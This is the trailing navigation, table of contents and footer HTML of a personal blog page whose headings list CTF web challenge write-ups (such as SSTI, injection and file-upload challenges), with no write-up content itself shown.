icon-grid-sharp"></i></div><div class=btn-toggle-mode><i class="iconfont icon-contrast-sharp"></i></div><div class=btn-scroll-top><i class="iconfont icon-chevron-up-circle-sharp"></i></div></div><aside class=sidebar-mobile style=display:none><div class=sidebar-wrapper><div class="sidebar-item sidebar-pages"><h3>Pages</h3><ul><li><a href=/>Home</a></li><li><a href=/archives/>Archives</a></li><li><a href=/search/>Search</a></li><li><a href=/index.xml>Feed</a></li></ul></div><div class="sidebar-item sidebar-links"><h3>Links</h3><ul><li><a href=https://github.com/zrquan target=_blank><span>GitHub</span></a></li></ul></div><div class="sidebar-item sidebar-tags"><h3>Tags</h3><div><span><a href=/tags/ctf/>Ctf</a>
</span><span><a href=/tags/cve/>Cve</a>
</span><span><a href=/tags/deserialize/>Deserialize</a>
</span><span><a href=/tags/emacs/>Emacs</a>
</span><span><a href=/tags/fastapi/>Fastapi</a>
</span><span><a href=/tags/fastjson/>Fastjson</a>
</span><span><a href=/tags/java/>Java</a>
</span><span><a href=/tags/kotlin/>Kotlin</a>
</span><span><a href=/tags/org-mode/>Org-Mode</a>
</span><span><a href=/tags/vscode/>Vscode</a>
</span><span><a href=/tags/web/>Web</a></span></div></div><div class="sidebar-item sidebar-toc"><h3>Table of Contents</h3><nav id=TableOfContents><ul><li><a href=#单身杯>单身杯</a><ul><li><a href=#easy-mem-1>easy_mem_1</a></li><li><a href=#easy-mem-2>easy_mem_2</a></li><li><a href=#easy-mem-3>easy_mem_3</a></li><li><a href=#没耳朵都可以>没耳朵都可以</a></li><li><a href=#好玩的-php>好玩的 PHP</a></li><li><a href=#迷雾重重>迷雾重重</a></li><li><a href=#ez-inject>ez_inject</a></li><li><a href=#ezzz-ssti>ezzz_ssti</a></li><li><a href=#简单的文件上传>简单的文件上传</a></li></ul></li><li><a href=#西瓜杯>西瓜杯</a><ul><li><a href=#她说她想结婚>她说她想结婚</a></li><li><a href=#你是我的眼>你是我的眼</a></li><li><a href=#codeinject>CodeInject</a></li><li><a href=#tpdoor>tpdoor</a></li><li><a href=#easy-polluted>easy_polluted</a></li></ul></li><li><a href=#未完持续-dot-dot-dot>未完持续&mldr;</a></li></ul></nav></div></div></aside></main><footer><div class="container-lg clearfix"><div class="col-12 footer"><span>&copy; 2021-2024
<a href=https://zrquan.github.io/>zrquan</a>
| <a href=https://github.com/zrquan/zrquan.github.io>Source code</a>
| Powered by <a href=https://github.com/andrew-aiken/hugo-theme-fuji/ target=_blank>Fuji</a> & <a href=https://gohugo.io/ target=_blank>Hugo</a></span></div></div></footer><script defer src=https://cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js></script><script defer src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.0/lazysizes.min.js></script><script defer src=https://cdn.jsdelivr.net/npm/prismjs@1.23.0/components/prism-core.min.js></script><script defer src=https://cdn.jsdelivr.net/npm/prismjs@1.23.0/plugins/autoloader/prism-autoloader.min.js></script><script defer src=/assets/js/fuji.min.js></script><script async src=https://unpkg.com/mermaid@8.2.3/dist/mermaid.min.js></script></body></html>